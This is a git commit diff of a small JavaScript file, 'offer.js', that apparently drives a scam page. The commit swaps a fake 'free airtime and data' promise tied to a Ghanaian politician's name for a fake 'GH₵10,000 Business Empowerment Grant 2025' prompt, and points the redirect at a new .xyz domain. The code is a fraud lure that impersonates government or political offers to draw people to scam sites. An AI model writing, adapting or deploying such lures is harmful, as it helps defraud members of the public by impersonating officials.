ddf5599aa169a9e51c593e34097766cd99b76c33
lagboyme <lagboy33+me@gmail.com>
2025-09-19 12:39:50 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,7 +1,8 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = '0k'
-password=prompt('SMS: Welcome to Ghana GH₵10 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
+password=prompt('SMS: Welcome to Ghana GH₵10,000 Business Empowerment Grant 2025 Portal, Kindly Press OK to Proceed ','ok');
 if (password != 'ok') {
-location.href='https://mahama.data-offer.xyz/15GB';
+location.href='https://business-reward.goprogram.xyz/Grant';
 
 }
+
